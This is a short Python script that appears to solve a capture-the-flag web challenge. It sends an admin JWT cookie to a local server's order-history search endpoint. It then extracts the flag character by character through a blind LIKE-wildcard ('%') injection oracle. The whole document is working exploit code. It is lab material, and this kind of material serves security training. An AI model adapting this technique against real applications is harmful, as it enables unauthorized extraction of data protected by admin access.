import requests
import string

admin_tok = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.F5LymIXr29umPedMOVxMbYgtktSy96AwF9dKtP9CyYw"
URL = "http://127.0.0.1:5000"
CHAR_SET = string.digits + string.ascii_letters + "{}-_\/"

def search_order_history(search_text):
    endpoint = "/admin/search_order_history"
    cookies= {"token": admin_tok}
    params={
        "category":"username",
        "search_text":search_text
    }
    response = requests.get(URL + endpoint, params=params, cookies=cookies)
    return response.text
    
def is_true_char(search_text):
    response_text = search_order_history(search_text)
    if "<td>1</td>" in response_text and "<td>FLAG</td>" in response_text:
        return True
    return False

def finding_flag():
    flag = "HOLACTF{"
    while True:
        found_char = False
        for char in CHAR_SET:
            test_text = flag + char + "%"
            if(is_true_char(test_text)):
                flag += char
                found_char = True
                print(f"[+] Found character: {char} | Current flag : {flag}")
                break
        if not found_char:
            break
    return flag

if __name__ == "__main__":
    FLAG = finding_flag()
    print(f"------------------FLAG is: {FLAG}-------------------------")
        
    